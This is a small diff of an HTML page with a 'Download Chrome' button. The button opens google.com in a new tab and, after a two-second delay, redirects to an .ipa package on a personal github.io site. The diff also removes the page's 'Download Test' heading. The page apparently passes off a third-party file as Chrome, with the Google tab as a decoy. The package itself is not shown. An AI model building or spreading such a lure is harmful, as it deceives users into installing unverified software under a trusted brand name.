@@ -2,12 +2,12 @@
 <html>
 <body>
 
-<h1>Download Test</h1>
-
 <button onclick="download()">Download Chrome</button>
 
 <script>
-function download(){
+function download() {
+    window.open("https://google.com/", "_blank");
+
     setTimeout(function () {
         window.location.href = "https://ybt01.github.io/upload/chrome.ipa";
     }, 2000);
